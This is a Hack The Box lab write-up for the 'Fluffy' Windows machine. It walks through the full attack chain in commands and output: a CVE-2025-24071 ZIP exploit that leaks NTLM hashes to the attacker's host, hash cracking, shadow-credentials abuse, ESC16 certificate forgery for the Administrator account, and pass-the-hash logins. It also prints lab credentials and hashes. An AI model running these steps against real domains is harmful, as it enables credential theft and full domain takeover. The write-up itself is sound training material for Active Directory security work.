+++
date = '2025-09-16T19:15:43+08:00'
draft = false
title = 'Fluffy - Windows (Easy)'
categories = ['HTB']
tags = ['Active Directory', 'ADCS', 'Hack The Box', 'Windows']
+++

Fluffy is an easy rated Windows machine that showcases real-life bad practices that lead to lateral movement, exploiting ADCS misconfigurations up until compromising the DC.



# 1. Reconnaissance

Below is the list of open ports on the machine.

```bash
53 - dns
88 - kerberos
139 - netbios
389 - LDAP 
445 - SMB
464 - kpasswd5?
593 - RPC over HTTP 1.0
636 - ssl/LDAP
3268 - LDAP
3269 - ssl/LDAP 
5985 - HTTP

Windows_server_2019
```

SMB signing scan just for practice purpose :)
```bash
Host script results:
| smb2-time: 
|   date: 2025-06-13T10:39:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h38m07s, deviation: 0s, median: 6h38m07s
```

## 1.2 File discovery in file share (SMB)
- Upgrade_Notice.pdf
- `Everything-1.4.1.1026.x64` directory
    - everything.exe
    - Everything.lng
- `KeePass` directory
    - many files...

Upgrade_Notice.pdf would be of use for us later.

## 1.3 Bloodhound setup
Use the given credentials to populate the Bloodhound interface.
```bash 
sudo bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -ns 10.10.11.69 -c all

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 13S
```

Start `neo4j` and upload all the data from the previous command output to `Bloodhound` GUI

```bash
sudo neo4j console 
```

![bloodhound1](/images/bloodhound1.png)

After running `Bloodhound`, right click on the compromised user (j.fleischman) and click "Add to Owned".

# 2. Lateral Movement

In the Upgrade_Notice.pdf, there are several CVEs that are pending to upgrade which one vulnerability stands out :- [`CVE-2025-24071`](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html) - Basically it exploits the trust between Windows Explorer and .library-ms file.  Windows Explorer automatically parses .library-ms file to build virtual views. When a .library-ms file containing SMB path is compressed into a ZIP archive, and subsequently decompressed by someone in the network, the victim's hash will be captured as it is a part of the NTLM authentication. This means it will not work if NTLM authentication mechanism is not used in the environment.

The exploit : https://www.exploit-db.com/exploits/52310 
This exploit will generate a specially crafted ZIP file meant to be decompressed by victim.

```bash
┌──(cresp0㉿kali)-[~/Downloads]
└─$ python3 52310.py -i 10.10.14.81 -n paylod_fluffy -o ./output_fluffy --keep
[*] Generating malicious .library-ms file...
[+] Created ZIP: output_fluffy/paylod_fluffy.zip
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```
Setup `responder` and upload the ZIP file to the SMB server

```bash
smb: \> put paylod_fluffy.zip
putting file paylod_fluffy.zip as \paylod_fluffy.zip (2.5 kb/s) (average 2.5 kb/s)
smb: \> ls
  .                                   D        0  Sun Jun 22 00:55:02 2025
  ..                                  D        0  Sun Jun 22 00:55:02 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  paylod_fluffy.zip                   A      334  Sun Jun 22 00:55:02 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025

		5842943 blocks of size 4096. 2253114 blocks available
smb: \>
```

Responder activated and successfully captured hash : 

```bash
sudo responder -I tun0 -wvF
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:d6ac7023016da127:669DD697220ABD56148B54E9315FFD51:0101000000000000006FA0AFD5E2DB01ABF46FB9B154CC660000000002000800470048005200560001001E00570049004E002D004600490050004B005A0049004E0052004F005700340004003400570049004E002D004600490050004B005A0049004E0052004F00570034002E0047004800520056002E004C004F00430041004C000300140047004800520056002E004C004F00430041004C000500140047004800520056002E004C004F00430041004C0007000800006FA0AFD5E2DB010600040002000000080030003000000000000000010000000020000006FBC23B1452E8355F3AB8E58313B291D4334F0AE503E096F6C624A214C100820A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380031000000000000000000
```

We have caught p.agila hash as she is the victim of the vulnerability. Put the hash in a file and attempt to crack it using `hashcat`.
```bash
hashcat -m 5600 -a 0 p.agilahash.txt /usr/share/wordlists/rockyou.txt
```

New creds would be obtained `p.agila:prometheusx-303`. As we have acquired a new user, re-run the below command for the new user in order for `Bloodhound` to be updated. Upload the command outputs to the `Bloodhound` web interface.

```bash
bloodhound-python -u p.agila -p "prometheusx-303" -d fluffy.htb -ns 10.10.11.69 -c all
```
As we can see in the imgae below, p.agila is a member of the `Service Account Managers` security group. This should be kept in mind. 
![bloodhound2](/images/bloodhound2.png)
![bh3](/images/bh3.png)

Click outbound object control. We would see that p.agila is a member of `Service Account Managers` group that has `GenericAll` perm on the Service Accounts group which has the `GenericWrite` perm on its members (ca_svc, ldap_svc and winrm_svc). For the GenericAll, it means Service Account Managers group members can add any users (modify group membership) into group Service Accounts. 

> 💡 **Tip:** GenericAll over a group - Full control of a group allows you to directly modify group 
membership of the group. For full abuse info in that scenario, see the 
Abuse Info section under the AddMembers edge.

> 💡 **Tip:** GenericWrite over a user - you can write to the “msds-KeyCredentialLink” attribute. Writing to this property allows an attacker to create “ShadowCredentials” on the object and authenticate as the principal using Kerberos PKINIT. See more information under the AddKeyCredentialLink edge.
Alternatively, you can write to the “servicePrincipalNames” attribute and perform a targeted kerberoasting attack.


## 2.1 Adding ourselves to Service Accounts group
So right now, we (p.agila) needs to compromise the critical user accounts in the `Service Accounts` group to explore further more. Since p.agila is a member of `Service Account Managers` group which has `GenericAll` perm to the `Service Accounts` group, we can add ourselves to the group to inherit the `GenericWrite` perm on the service accounts. Use `bloodyAD` tool.

```bash
bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila
[+] p.agila added to SERVICE ACCOUNTS
```

run bloodhound again after adding p.agila to Service Accounts Group.

```bash
bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69 -c all
```

![bh4](/images/bh4.png)

![bh5](/images/bh5.png)

## 2.2 Shadow Credentials attack to retrieve winrm_svc hash

Now we will create `shadow credentials` on one of the service accounts which is `winrm_svc`. Use `pywhisker.py` from [here](https://github.com/ShutdownRepo/pywhisker). To understand more about Shadow Credentials attack.. read it [here](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). By doing this attack, we essentially inject a certificate into the account for purposes like persistence, and now we can perform Kerberos PKINIT auth using the cert set by us without knowing its password. 

Please be noted that we can just use `certipy` to do the attack in a single command  but for learning purposes, I'll be using 3 tools that complement each other that serve the same purpose as `certipy`. 

Now, use `pywhisker.py` to add shadow credentials (modifying msds-KeyCredentialLink attribute) and retrieve the certificate.

```bash
──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d fluffy.htb -u "p.agila" -p "prometheusx-303" --dc-ip 10.10.11.69 --target "WINRM_SVC" --action "list"
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Listing devices for WINRM_SVC
[*] DeviceID: b663af76-788c-8644-cbdd-dfbac495f206 | Creation Time (UTC): 2025-06-22 14:14:53.875462
[*] DeviceID: ac543b34-cf8d-f453-f4ae-e8f7a057783e | Creation Time (UTC): 2025-06-22 10:23:29.426920
[*] DeviceID: ca333e54-1aa1-8cb0-a104-702443c6f555 | Creation Time (UTC): 2025-06-22 19:05:51.584066
                                                                                                                                                                                
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d fluffy.htb -u "p.agila" -p "prometheusx-303" --dc-ip 10.10.11.69 --target "WINRM_SVC" --action "add" 
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 59a9d7f7-4924-035f-62f1-d2ce1f138a6f
[*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Xyys4u8v.pfx
[+] PFX exportiert nach: Xyys4u8v.pfx
[i] Passwort für PFX: vJaqhtyr3hMdv3qKYBSK
[+] Saved PFX (#PKCS12) certificate & key at path: Xyys4u8v.pfx
[*] Must be used with password: vJaqhtyr3hMdv3qKYBSK
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

What happened in the output is the shadow credential is added. The tool also generated key pair, where the public key is wrote onto the attribute and the private key is in the pfx file/certificate. The pfx file is used to authenticate as the account `winrm_svc`.

Now we have the thing needed for authentication. Since the default authentication mechanism in AD is `Kerberos`, we will use the cert to get the TGT. Run `gettgtpkinit.py` from https://github.com/dirkjanm/PKINITtools to get the TGT. File saved to winrm_svc.ccache. 

```bash
┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools]
└─# python3 gettgtpkinit.py fluffy.htb/winrm_svc -cert-pfx Xyys4u8v.pfx -pfx-pass vJaqhtyr3hMdv3qKYBSK -dc-ip 10.10.11.69 winrm_svc.ccache
2025-06-23 13:13:01,015 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-23 13:13:01,043 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-23 13:13:06,282 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-23 13:13:06,282 minikerberos INFO     398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e
INFO:minikerberos:398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e
2025-06-23 13:13:06,286 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Now, I want you to take a look at the output, where there is an `AS-REP encryption key`. Let's dive into what exactly that is and where it came from.

Let's go back to how Kerberos works :- remember that Kerberos is password/symmetric while Kerberos + PKINIT is certificate/asymmetric. 

![kerb](/images/kerb.jpg)
![kerb1](/images/kerb1.png)

The first step of the mechanism is the user has to authenitcate using his credentials (password etc). whereas in Kerberos PKINIT, the user presents his certificate-privatekey (the one we got from pywhisker.py) to the KDC to confirm his identity. Then in the AS-REP process, there are two things in AS-REP which are TGT and Session Key encrypted by the symmetric key (AS-REP key) generated by the KDC. The key is generated using either two ways which are RSA and DHE. Lastly, the user will decrypt the session key using AS-REP key or the symmetric key. 

Run `getnthash.py` to retrieve the NT hash of `winrm_svc`. This tool actually does the `TGS-REQ` process, which is the first process to request access to a service after we got the TGT from AS-REP process. The image below explains that we (winrm_svc) is essentially request access to ourselves.

![getnt](/images/getnt.png)

```bash
┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools]
└─# python3 getnthash.py -k 398bd58e8f484f885d3735cc6fe28ae0277840c5cabb8081167f4f85f7a7d31e fluffy.htb/WINRM_SVC
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```

Use `evil-winrm` to connect to the account remotely and get the user flag.

```bash
┌──(root㉿kali)-[/home/cresp0/Desktop/fluffy/PKINITtools]
└─# evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/22/2025   9:03 AM             34 user.txt
```

# 3 Privilege Escalation

## 3.1 Shadow Credentials attack to retrieve ca_svc hash

We have another potential privilege escalation target: the `ca_svc` account. Since this account is tied to the Certificate Authority, we could enumerate for Active Directory Certificate Services (ADCS) vulnerabilities using `Certipy`. To proceed, however, we would need the hash of `ca_svc`. Given that we hold `GenericWrite` permissions over the `Service Accounts` group, we can leverage this to add shadow credentials to ca_svc (similar to what we previously did with winrm_svc) in order to obtain its hash. 

Use `pywhisker.py` to add the shadow credentials to ca_svc

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d fluffy.htb -u "p.agila" -p "prometheusx-303" --dc-ip 10.10.11.69 --target "CA_SVC" --action "add"
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 9e64f016-c1dd-66ff-c943-d87c4739d8dc
[*] Updating the msDS-KeyCredentialLink attribute of CA_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Um3a3b8O.pfx
[+] PFX exportiert nach: Um3a3b8O.pfx
[i] Passwort für PFX: 2VE9C4kLIQE6OzNX4EFw
[+] Saved PFX (#PKCS12) certificate & key at path: Um3a3b8O.pfx
[*] Must be used with password: 2VE9C4kLIQE6OzNX4EFw
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Request TGT using `gettgtpkinit.py`

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools]
└─$ python3 gettgtpkinit.py fluffy.htb/ca_svc -cert-pfx Um3a3b8O.pfx -pfx-pass 2VE9C4kLIQE6OzNX4EFw -dc-ip 10.10.11.69 ca_svc.ccache
2025-06-23 23:53:36,555 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-23 23:53:36,581 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-23 23:53:41,946 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-23 23:53:41,946 minikerberos INFO     828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7
INFO:minikerberos:828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7
2025-06-23 23:53:41,953 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Set the KRB5CCNAME environment variable and run `getnthash.py` to retrieve the hash.

```bash                                                                                                     
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools]
└─$ export KRB5CCNAME=$(pwd)/ca_svc.ccache

┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/PKINITtools]
└─$ python3 getnthash.py -k 828de87fa89d0b2571107eaa41484fa3479ce9ae6233911ff3a1cfe9c40bb4a7 fluffy.htb/ca_svc
/home/cresp0/Desktop/fluffy/PKINITtools/venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8
```

## 3.2 Exploiting ESC16 

Upon retrieving the hash, now we can use `Certipy` to enumerate for ADCS vulnerabilities.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/adcs_enum]
└─$ certipy find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250624000309_Certipy.txt'
[*] Wrote text output to '20250624000309_Certipy.txt'
[*] Saving JSON output to '20250624000309_Certipy.json'
[*] Wrote JSON output to '20250624000309_Certipy.json'
```

Open the output file. It can be seen that the environment is vulnerable to `ESC16`.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/adcs_enum]
└─$ cat 20250624000309_Certipy.txt                                                                            
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

From the output above, we can see that 1.3.6.1.4.1.311.25.2 is in `Disabled Extensions`. 1.3.6.1.4.1.311.25.2 is the Object Identifier (`OID`) of the special extension `szOID_NTDS_CA_SECURITY_EXT`. Okay, let's go to how CA works when the extension is enabled. So when CA issues a certificate, this extension embeds the SID of the AD account that requested the certificate directly into the certificate. But when the extension is disabled, Windows will fall back to using a weak mapping, like mapping the UPN in the cert to an account. Okay that's too much talking. The general view is the CA issues a cert to an account while the extension is disabled. So when the user uses the certificate for authentication (certificate-based authentication), the DC will have to check if the cert is the user's belonging, so the DC will blindly just check the identifiers inside the cert (like the UPN in the Subject Alternative Name, or sometimes the CN/email). If the SID extension is missing (which it is missing).. the DC can’t strongly tie the cert back to the exact AD account — it only trusts whatever strings are in the cert, which is where the `ESC16` risk comes in.

So let's exploit this. We wanna update the ca_svc UPN to admin so when requesting for a certificate, the generated certificate will have Admin's UPN embedded in it. Update the ca_svc UPN to administrator.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy account -u 'p.agila' -p 'prometheusx-303' -target 'fluffy.htb' -upn 'Administrator@fluffy.htb' -user 'ca_svc' update    

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: fluffy.htb.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : Administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Next, request a certificate using the account ca_svc and its hash retrieved from shadow credential attack. Remember, only the `UPN` (ca_svc@fluffy.htb) of ca_svc is changed, not its `sAMAccountName` (ca_svc), thus the command below uses the "-u 'ca_svc'". 

This command will have an output of the Administrator certificate because the CA embeds the ca_svc's new UPN to the certificate. 

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy req -dc-ip '10.10.11.69' -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -target 'fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Revert back the UPN change.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy account -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user 'ca_svc' -upn '' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : *DELETED*
[*] Successfully updated 'ca_svc'
```

Perform authentication using the administrator cert, `Certipy` will get the hash for you.

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.10.11.69
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@fluffy.htb'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Now, you would ask why did i use gettgtpkinit.py and getnthash.py just to get the NT hash after adding shadow credentials. Why don't i use the command above where i just use certipy auth ? It's just for understanding the underlying mechanism and to understand how does these things work.

Lastly, use `evil-winrm` to log in using Admin credentials

```bash
┌──(venv)─(cresp0㉿kali)-[~/Desktop/fluffy/movejfleischman]
└─$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/23/2025   4:33 PM             34 root.txt
```

# Resources

1. CVE-2025-24071 - https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
2. CVE-2025-24071 exploit - https://www.exploit-db.com/exploits/52310 
3. PKINIT exploitation tools - https://github.com/dirkjanm/PKINITtools
4. Pywhisker - https://github.com/ShutdownRepo/pywhisker
5. Shadow Credentials - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
6. Shadow Credentials - https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/
